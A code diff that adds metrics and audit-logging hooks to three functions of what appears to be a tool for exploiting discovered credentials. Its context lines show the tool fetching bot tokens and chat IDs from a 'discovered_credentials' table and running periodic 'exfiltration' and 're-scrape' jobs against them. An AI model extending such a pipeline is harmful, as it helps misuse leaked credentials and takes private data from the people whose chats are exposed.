@@ -42,6 +42,13 @@ async def _exfiltrate_logic(cred_id: str):
     from app.services.broadcaster_srv import BroadcasterService
     broadcaster = BroadcasterService()
     await broadcaster.send_log(f"🕵️ Starting exfiltration for CredID: `{cred_id}`")
+
+    # T010: Observability hook
+    from app.core.metrics import metrics
+    from app.core.audit import AuditLogger
+    metrics.inc("exfiltrate.started")
+    audit_log = AuditLogger()
+    audit_log.log_event("exfiltrate.start", {"cred_id": cred_id})
     
     # Fetch credential
     response = await async_execute(db.table("discovered_credentials").select("bot_token, chat_id").eq("id", cred_id))
@@ -145,7 +152,13 @@ def enrich_credential(cred_id: str):
 
 async def _enrich_logic(cred_id: str):
     logger.info(f"✨ [Enrich] Starting enrichment for credential {cred_id}")
-    
+
+    # T010: Observability hook
+    from app.core.metrics import metrics
+    from app.core.audit import AuditLogger
+    metrics.inc("enrich.started")
+    audit_log = AuditLogger()
+
     # Local instantiation for logging
     from app.services.broadcaster_srv import BroadcasterService
     broadcaster = BroadcasterService()
@@ -552,6 +565,10 @@ async def _rescrape_active_logic():
     """
     Query all active credentials with a chat_id and trigger exfiltration.
     """
+    # T010: Observability hook
+    from app.core.metrics import metrics
+    metrics.inc("rescrape.started")
+
     from app.services.broadcaster_srv import BroadcasterService
     broadcaster = BroadcasterService()
     await broadcaster.send_log("🔄 **Re-scrape**: Starting periodic scrape of active credentials...")
